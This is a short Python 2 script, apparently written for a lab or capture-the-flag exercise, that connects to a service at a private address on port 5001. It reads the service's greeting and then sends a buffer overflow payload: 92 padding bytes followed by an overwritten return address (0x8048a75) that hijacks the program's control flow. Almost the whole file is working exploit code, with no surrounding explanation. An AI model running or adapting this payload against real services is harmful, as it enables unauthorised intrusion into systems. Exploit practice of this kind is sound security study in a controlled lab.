#!/usr/bin/env python
import socket
import binascii
import struct
import time
import os
import sys
from struct import *
'''
'''
host = '10.0.0.91'
port = 5001
if len(sys.argv) > 1:
    port = int(sys.argv[1].strip())
print('port %d' % port)
server_addr = (host, port)

retaddr = 0x8048a75
ret_net = pack('l', retaddr)

sendstr = chr(0)*92+ret_net+'Z'*10+chr(10)+chr(0)
if True:
        try:    
            print('try connect')
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(server_addr)
            print('connect ok')
        except socket.error, e:
            print('connect fail %s' % e)
            exit(1)
        got = sock.recv(1024)
        if got is None or len(got) == 0:
          print('got nothting, bye')
          exit(1)
        print('got %s' % got)
        time.sleep(3) 
        got = sock.recv(1024)
        print('got %s' % got)

        sock.sendall(sendstr)
        print('sent it')
        time.sleep(3) 
        got = sock.recv(1024)
        print('got %s' % got)
        sock.close()
